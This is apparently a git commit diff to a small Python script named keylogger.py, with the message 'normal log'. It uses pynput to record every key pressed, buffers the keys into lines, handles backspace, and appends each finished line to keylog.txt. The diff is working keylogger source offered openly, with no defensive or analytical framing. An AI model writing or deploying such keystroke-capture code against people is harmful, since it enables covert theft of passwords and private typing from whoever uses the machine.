7cdc44cdf792198ed11b4e07ab5884aaee50d58d
bigazzzz <bigazzzz@gmail.com>
2019-11-19 13:59:05 +0300

    normal log

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,12 +1,34 @@
 from pynput.keyboard import Key, Listener
 
-def on_press(key):
+def write_line():
+    global line
     fp=open("keylog.txt","a")
-    print(key)
-    fp.write(str(key)+"\n")
+    fp.write(line)
     fp.close()
-    if key == Key.esc:
-        return False
+    line = ''
 
+def on_press(key):
+    global line
+    if key == Key.enter:
+        write_line()
+    elif key == Key.esc:
+        write_line()
+        return False
+    elif key == Key.backspace:
+        line = line[:-1]
+    else:
+        try:
+            button = key.char.strip("'")
+        except:
+            button = '[' + str(key) + ']'
+
+        line += button
+
+
+
+line = ''
+fp=open("keylog.txt","w")
+fp.write(line)
+fp.close()
 with Listener(on_press=on_press) as listener:
     listener.join()
